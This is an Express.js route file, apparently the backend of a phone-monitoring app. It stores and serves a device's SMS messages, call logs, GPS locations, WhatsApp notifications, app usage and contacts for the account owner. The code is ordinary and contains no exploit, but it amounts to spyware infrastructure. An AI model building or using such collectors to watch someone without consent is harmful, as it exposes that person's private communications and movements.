// routes/data.js
const express = require('express');
const router = express.Router();
const auth = require('../middleware/auth'); // middleware JWT
const Device = require('../models/Device');

const Sms = require('../models/Sms');
const Call = require('../models/Call');
const Location = require('../models/Location');
const AppUsage = require('../models/AppUsage');
const ContactBatch = require('../models/ContactBatch');
const Notification = require('../models/Notification');

/**
 * Helper: valida deviceId e owner (req.user)
 * Retorna device doc ou lança erro com status e mensagem.
 */
async function ensureDeviceBelongsToUser(deviceId, user) {
  if (!deviceId) {
    const err = new Error('deviceId required');
    err.status = 400;
    throw err;
  }
  const device = await Device.findOne({ deviceId });
  if (!device) {
    const err = new Error('device not found');
    err.status = 404;
    throw err;
  }
  if (!device.owner || device.owner.toString() !== user._id.toString()) {
    const err = new Error('device not associated to user');
    err.status = 403;
    throw err;
  }
  return device;
}

/* ------------------------------
   POST endpoints: receive data
   ------------------------------ */

// POST /api/data/sms
router.post('/sms', auth, async (req, res) => {
  try {
    const { deviceId, sender, message, timestamp } = req.body;
    await ensureDeviceBelongsToUser(deviceId, req.user);
    const doc = new Sms({
      deviceId,
      user: req.user._id,
      sender: sender || null,
      message: message || '',
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await doc.save();
    return res.json({ ok: true, id: doc._id });
  } catch (err) {
    console.error('POST /data/sms error', err);
    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
  }
});

// POST /api/data/call
router.post('/call', auth, async (req, res) => {
  try {
    const { deviceId, number, type, state, timestamp, duration } = req.body;
    await ensureDeviceBelongsToUser(deviceId, req.user);
    const doc = new Call({
      deviceId,
      user: req.user._id,
      number: number || null,
      type: type || null,
      state: state || null,
      timestamp: timestamp ? new Date(timestamp) : new Date(),
      duration: typeof duration === 'number' ? duration : 0
    });
    await doc.save();
    return res.json({ ok: true, id: doc._id });
  } catch (err) {
    console.error('POST /data/call error', err);
    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
  }
});

// POST /api/data/location
router.post('/location', auth, async (req, res) => {
  try {
    const { deviceId, lat, lon, accuracy, timestamp } = req.body;
    await ensureDeviceBelongsToUser(deviceId, req.user);
    const doc = new Location({
      deviceId,
      user: req.user._id,
      lat: Number(lat),
      lon: Number(lon),
      accuracy: typeof accuracy === 'number' ? accuracy : (accuracy ? Number(accuracy) : null),
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await doc.save();
    return res.json({ ok: true, id: doc._id });
  } catch (err) {
    console.error('POST /data/location error', err);
    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
  }
});

// POST /api/data/whatsapp (notifications)
router.post('/whatsapp', auth, async (req, res) => {
  try {
    const { deviceId, message, timestamp, packageName } = req.body;
    await ensureDeviceBelongsToUser(deviceId, req.user);
    const doc = new Notification({
      deviceId,
      user: req.user._id,
      packageName: packageName || 'com.whatsapp',
      message: message || '',
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await doc.save();
    return res.json({ ok: true, id: doc._id });
  } catch (err) {
    console.error('POST /data/whatsapp error', err);
    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
  }
});

// POST /api/data/app-usage
router.post('/app-usage', auth, async (req, res) => {
  try {
    const { deviceId, packageName, totalTime, lastTimeUsed } = req.body;
    await ensureDeviceBelongsToUser(deviceId, req.user);
    const doc = new AppUsage({
      deviceId,
      user: req.user._id,
      packageName: packageName || '',
      totalTime: Number(totalTime) || 0,
      lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date()
    });
    await doc.save();
    return res.json({ ok: true, id: doc._id });
  } catch (err) {
    console.error('POST /data/app-usage error', err);
    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
  }
});

// POST /api/data/contacts  (contactsArray in body)
router.post('/contacts', auth, async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;
    if (!Array.isArray(contacts)) {
      return res.status(400).json({ error: 'contacts must be array' });
    }
    await ensureDeviceBelongsToUser(deviceId, req.user);
    // Save batch as a document (timestamped snapshot)
    const doc = new ContactBatch({
      deviceId,
      user: req.user._id,
      contacts,
      timestamp: new Date()
    });
    await doc.save();
    return res.json({ ok: true, id: doc._id });
  } catch (err) {
    console.error('POST /data/contacts error', err);
    return res.status(err.status || 500).json({ error: err.message || 'server_error' });
  }
});

/* ------------------------------
   GET endpoints: fetch data for the authenticated user's devices
   ------------------------------ */

// GET /api/data/sms
router.get('/sms', auth, async (req, res) => {
  try {
    const docs = await Sms.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(200).lean();
    return res.json(docs);
  } catch (err) {
    console.error('GET /data/sms error', err);
    return res.status(500).json({ error: 'server_error' });
  }
});

// GET /api/data/call
router.get('/call', auth, async (req, res) => {
  try {
    const docs = await Call.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(200).lean();
    return res.json(docs);
  } catch (err) {
    console.error('GET /data/call error', err);
    return res.status(500).json({ error: 'server_error' });
  }
});

// GET /api/data/location
router.get('/location', auth, async (req, res) => {
  try {
    const docs = await Location.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(500).lean();
    return res.json(docs);
  } catch (err) {
    console.error('GET /data/location error', err);
    return res.status(500).json({ error: 'server_error' });
  }
});

// GET /api/data/app-usage
router.get('/app-usage', auth, async (req, res) => {
  try {
    const docs = await AppUsage.find({ user: req.user._id }).sort({ lastTimeUsed: -1 }).limit(500).lean();
    return res.json(docs);
  } catch (err) {
    console.error('GET /data/app-usage error', err);
    return res.status(500).json({ error: 'server_error' });
  }
});

// GET /api/data/contacts  -> returns latest contact batches
router.get('/contacts', auth, async (req, res) => {
  try {
    const docs = await ContactBatch.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(20).lean();
    return res.json(docs);
  } catch (err) {
    console.error('GET /data/contacts error', err);
    return res.status(500).json({ error: 'server_error' });
  }
});

// GET /api/data/notifications
router.get('/notifications', auth, async (req, res) => {
  try {
    const docs = await Notification.find({ user: req.user._id }).sort({ timestamp: -1 }).limit(200).lean();
    return res.json(docs);
  } catch (err) {
    console.error('GET /data/notifications error', err);
    return res.status(500).json({ error: 'server_error' });
  }
});

module.exports = router;
